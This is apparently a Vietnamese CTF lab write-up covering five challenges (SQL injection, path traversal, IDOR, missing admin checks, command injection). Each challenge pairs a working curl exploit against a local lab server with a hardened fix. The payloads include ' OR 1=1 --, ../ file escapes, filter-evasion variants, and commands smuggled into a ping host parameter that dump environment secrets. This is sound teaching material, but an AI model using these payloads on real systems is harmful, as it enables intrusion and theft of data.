## CTF #1 · SQL Injection — 30đ

**Mục tiêu:** cờ `FLAG{sqli-...}` nằm trong email của người dùng ẩn `zz_ctf_hidden` — user này không bao giờ hiện khi tìm kiếm thường.

**Root cause:** `searchUsers()` trong `src/db.js` nối chuỗi input vào `WHERE name LIKE '%${q}%'`. Payload phá cú pháp LIKE và thêm `OR 1=1` → trả về toàn bảng.

**Exploit:**

```bash
curl "http://127.0.0.1:3000/search?q=%27%20OR%201%3D1%20--"
#        payload decode:  ' OR 1=1 --
# → trang kết quả liệt kê cả zz_ctf_hidden, email chứa FLAG{sqli-...}
```

Cú pháp sau inject: `... LIKE '%' OR 1=1 --%'`. Hai gạch `--` comment phần `%'` còn lại. Lỗi hay gặp: quên URL-encode space/quote (curl không tự encode); dùng `'` sai loại.

**Cờ:** regex `FLAG\{sqli-[0-9a-f]+\}` trong response.

**Hardened:** `searchUsersSafe()` dùng `WHERE name LIKE ?` + `'%' || ? || '%'` — input chỉ là literal data, không cú pháp. Trả 200 với 0 dòng cho cùng payload.

**Bài học:** injection tồn tại vì *dữ liệu bị trộn vào cú pháp* — vá ở tầng query (parameterize), không vá bằng blacklist ký tự (luôn evade được: `OR 1=1/**/--`, `OR'1'='1'`).

## CTF #2 · Path Traversal — 25đ

**Mục tiêu:** đọc `flag-ctf.txt` ở GỐC của filesystem ảo — file **không** xuất hiện trong `GET /files` listing.

**Root cause:** `/download?name=` nối trực tiếp tên file vào path VFS mà không chặn `../` — `files/../../flag-ctf.txt` escape khỏi thư mục được phép.

**Exploit:**

```bash
curl "http://127.0.0.1:3000/download?name=../flag-ctf.txt"
# → nội dung file: FLAG{trav-...}
```

Listing `/files` chỉ cho thấy `files/readme.txt`, `files/notes.txt`, `files/secrets.txt` — cờ nằm NGOÀI `files/`, buộc phải `../` lên gốc. Đây là chi tiết giảng dạy hay: "biết tên file" không đủ — phải vượt khỏi jail.

**Hardened:** route từ chối mọi `..` và bắt buộc tiền tố `files/` → cùng payload trả 400.

**Bài học:** "sandbox" chỉ là sandbox khi đường dẫn được chuẩn hoá trước khi tra. Lỗi kinh điển: check `startsWith('files/')` TRƯỚC khi normalize `..` — thứ tự sai = bypass.

## CTF #3 · IDOR — 25đ

**Mục tiêu:** apiKey của dave (id=4) chính là `FLAG{idor-...}` — đọc được không cần đăng nhập.

**Root cause:** `GET /api/users/:id` trả toàn bộ record (kể cả `apiKey`, `email`) cho bất kỳ ai gọi — không kiểm tra session, không kiểm tra ownership.

**Exploit:**

```bash
curl http://127.0.0.1:3000/api/users/4
# → {"id":4,"name":"dave",...,"apiKey":"FLAG{idor-...}"}
```

**Hardened:** cùng endpoint trả 401 khi chưa đăng nhập, 403 khi session không phải chủ — `bob` (id=2) đọc `/api/users/4` vẫn 403.

**Bài học:** IDOR là dạng "object reference" thuần — số tuần tự đoán được, thiếu authorization check per-object. Map: OWASP A01, CWE-639.

## CTF #4 · Broken Access Control — 20đ

**Mục tiêu:** `FLAG{admin-...}` hiển thị ngay trên trang `/admin`.

**Root cause:** route `/admin` render trang quản trị mà **không kiểm tra gì cả** — không session, không role check.

**Exploit:**

```bash
curl http://127.0.0.1:3000/admin
# → trang admin hiện FLAG{admin-...}
```

Dễ nhất trong 10 thử thách — cố ý để demo "security by obscurity" thất bại.

**Hardened:** `/admin` trả 401 (chưa login) / 403 (không phải admin). Chi tiết hay: trả 403 chứ không 404 — để log phân biệt "không tồn tại" vs "cấm vào" (blue-team cần).

**Bài học:** mọi endpoint nhạy cảm phải tự hỏi "ai đang gọi, được quyền gì?" — không dựa vào "người dùng không biết URL".

## CTF #5 · Command Injection — 25đ

**Mục tiêu:** cờ nằm trong biến môi trường `SECLAB_CTF_CMD` của process lab — đọc bằng cách nối lệnh sau `host`.

**Root cause:** `/tools/ping?host=` ghép input vào `exec("ping -n 1 " + host)` — `exec` chạy qua shell (`cmd.exe`/`sh`) nên toán tử shell `&`/`;`/`|`/`&&`/`$(...)` đều hoạt động.

**Exploit:**

```bash
# Windows (lab chạy cmd.exe):
curl "http://127.0.0.1:3000/tools/ping?host=127.0.0.1+%26+set+SECLAB"
#  %26 = &  → exec chạy: ping -n 1 127.0.0.1 & set SECLAB
#  output chứa SECLAB_CTF_CMD=FLAG{cmd-...}

# Linux/macOS:
curl "http://127.0.0.1:3000/tools/ping?host=127.0.0.1%3B+env"
#  %3B = ;  → env in toàn bộ biến môi trường
```

Lỗi hay gặp: `&` không encode → bị coi là phân tách query param, server chỉ nhận `host=127.0.0.1`. Phải `%26`.

**Hardened:** `execFile('ping', ['-n','1',host])` (không qua shell) + whitelist `[a-zA-Z0-9.-]` → payload chứa `&` bị từ chối 400.

**Bài học:** khác biệt sống-còn giữa `exec(cmd string)` và `execFile(binary, argv[])` — execFile không qua shell nên metachar mất nghĩa. Đây là CVE class phổ biến nhất trong tool "chẩn đoán mạng" (ping/traceroute/nmap wrapper).
